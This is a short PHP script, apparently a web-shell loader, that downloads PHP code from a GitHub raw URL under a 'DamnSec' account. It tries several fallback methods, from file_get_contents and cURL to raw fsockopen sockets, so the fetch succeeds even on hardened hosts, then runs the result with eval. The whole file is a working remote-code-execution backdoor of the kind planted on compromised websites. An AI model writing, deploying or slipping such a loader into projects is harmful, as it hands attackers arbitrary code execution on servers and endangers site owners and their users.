<?php
$url = "https://raw.githubusercontent.com/DamnSec/x/main/1.txt";
$phpCode = null;

// Fungsi 1: file_get_contents
if (function_exists('file_get_contents')) {
    $phpCode = @file_get_contents($url);
}

// Fungsi 2: cURL
if ($phpCode === null && function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $phpCode = curl_exec($ch);
    curl_close($ch);
}

// Fungsi 3: fopen
if ($phpCode === null && function_exists('fopen')) {
    $handle = fopen($url, "r");
    if ($handle) {
        $phpCode = stream_get_contents($handle);
        fclose($handle);
    }
}

// Fungsi 8: fsockopen
if ($phpCode === null && function_exists('fsockopen')) {
    $urlParts = parse_url($url);
    $fp = fsockopen($urlParts['host'], 80, $errno, $errstr, 30);
    if ($fp) {
        $out = "GET " . $urlParts['path'] . " HTTP/1.1\r\n";
        $out .= "Host: " . $urlParts['host'] . "\r\n";
        $out .= "Connection: Close\r\n\r\n";
        fwrite($fp, $out);
        $response = '';
        while (!feof($fp)) {
            $response .= fgets($fp, 128);
        }
        fclose($fp);
        $phpCode = explode("\r\n\r\n", $response, 2)[1]; // Mengambil body response
    }
}

// Fungsi 11: HTTP/2 dengan cURL
if ($phpCode === null && function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_2_0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $phpCode = curl_exec($ch);
    curl_close($ch);
}

// Fungsi 12: HTTP dengan stream_context
if ($phpCode === null) {
    $options = [
        "http" => [
            "header" => "User-Agent: PHP\r\n" .
                        "Accept: text/html, */*\r\n",
            "method" => "GET"
        ]
    ];

    $context = stream_context_create($options);
    $phpCode = @file_get_contents($url, false, $context);
}

// Menjalankan kode PHP jika berhasil diambil
if ($phpCode !== false) {
    eval("?>".$phpCode);
} else {
    echo "Gagal mengambil kode dari URL.";
}
?>
